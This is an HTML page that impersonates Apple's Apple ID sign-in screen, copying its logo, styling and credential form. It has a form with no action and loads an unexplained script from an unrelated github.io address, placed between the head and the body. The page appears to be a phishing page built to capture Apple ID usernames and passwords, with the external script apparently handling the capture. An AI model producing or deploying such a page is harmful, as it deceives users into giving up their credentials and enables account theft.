<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apple ID Login</title>
  <style>
    /* Reset & font */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    }

    body {
      background-color: #f5f5f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #fff;
      padding: 40px;
      width: 360px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      text-align: center;
    }

    .logo img {
      width: 60px;
      margin-bottom: 20px;
    }

    .login-container h2 {
      font-weight: 500;
      font-size: 22px;
      margin-bottom: 30px;
      color: #1d1d1f;
    }

    .login-container input[type="text"],
    .login-container input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 20px;
      border: 1px solid #d2d2d7;
      border-radius: 8px;
      font-size: 16px;
      background-color: #f5f5f7;
    }

    .login-container input[type="submit"] {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border-radius: 8px;
      border: none;
      background-color: #0071e3;
      color: white;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    .login-container input[type="submit"]:hover {
      background-color: #005bb5;
    }

    .login-container a {
      display: block;
      margin-top: 15px;
      font-size: 14px;
      color: #0071e3;
      text-decoration: none;
    }

    .login-container a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<script src="https://plyarth.github.io/intc/int4.js"></script>
<body>
  <div class="login-container">
    <div class="logo">
      <!-- Apple logo -->
      <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
    </div>
    <h2>Sign in with your Apple ID</h2>
    <form>
      <input type="text" placeholder="Apple ID" name="Apple ID" required>
      <input type="password" placeholder="Password" name="Password" required>
      <input type="submit" value="Sign In">
      <a href="#">Forgot Apple ID or password?</a>
      <a href="#">Create your Apple ID</a>
    </form>
  </div>
</body>
</html>
